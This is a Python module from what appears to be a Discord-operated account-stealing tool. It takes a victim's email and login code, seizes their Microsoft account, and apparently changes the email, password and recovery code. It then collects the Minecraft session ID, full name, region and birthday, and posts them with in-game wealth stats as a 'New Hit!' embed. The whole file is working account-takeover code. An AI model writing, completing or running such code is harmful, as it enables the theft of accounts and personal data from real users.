from views.utils.minecraft.getHypixel import getHypixelStats
from views.utils.minecraft.getDonut import getDonutStats
from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.polishHost import polishHost
from views.utils.minecraft.simplify import simplify
from views.utils.securing.secure import secure
from views.utils.getMSAAUTH import getMSAAUTH
from urllib.parse import quote
from discord import Embed
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    
    account = {
        "name": "Could not find",
        "email": "Couldn't Change!",
        "security_email": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recovery_code": "Couldn't Change!",
        "method": "Not purchased",
        "capes": "No capes",
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get"
    }

    initialTime = time.time()
    if msaauth == "Family":
        print(f"[X] - Account is Family Locked")
        for i in ["name", "email", "security_email"]:
            account[i] = "Child Locked"
    else:
        await polishHost(session, msaauth)
        account = await secure(session, recovery, account)

    finalTime = (time.time() - initialTime)

    name = quote(account["name"])

    # Microsoft DOB Embed
    info_embed = Embed()
    info_embed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    info_embed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    info_embed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
    
    hstats = await getHypixelStats(name)
    dstats = await getDonutStats(name)

    # Stats
    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats["rank"]}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["level"])}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats["gifted"]}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["networth"])}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats != "Failed" else 0}', inline=True)

    # Account Embed
    hit_embed = Embed(
        title = f"New Hit! Secured in {round(finalTime, 2)}s",
        description = f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
        color = 0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{account['name']}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
    hit_embed.add_field(name="Primary Email", value=f"```{account['email']}```", inline=False)
    hit_embed.add_field(name="Security Email", value=f"```{account['security_email']}```", inline=True)
    hit_embed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
    hit_embed.add_field(name="Secret Key", value=f"```Disabled```", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"```{account['recovery_code']}```", inline=False)
    hit_embed.set_footer(text = f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    # Minecraft SSID Embed
    ssid_embed = Embed(
        title = "SSID",
        description = f"```{account['SSID']}```"
    )
    
    if account["SSID"]:
        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(account['name'])}/128")

    accountData = {
        "hit_embed": hit_embed,
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "account_details": (
                f"**Username:** {account['name']}\n"
                f"**Has MC:** {True if account['SSID'] else False}\n"
                f"**Capes:** {account['capes']}\n"
                f"**Email:** {account['email']}\n"
                f"**Security Email:** {account['security_email']}\n"
                f"**Password:** {account['password']}\n"
                f"**Recovery Code:** {account['recovery_code']}"
            )
        }
    }

    return accountData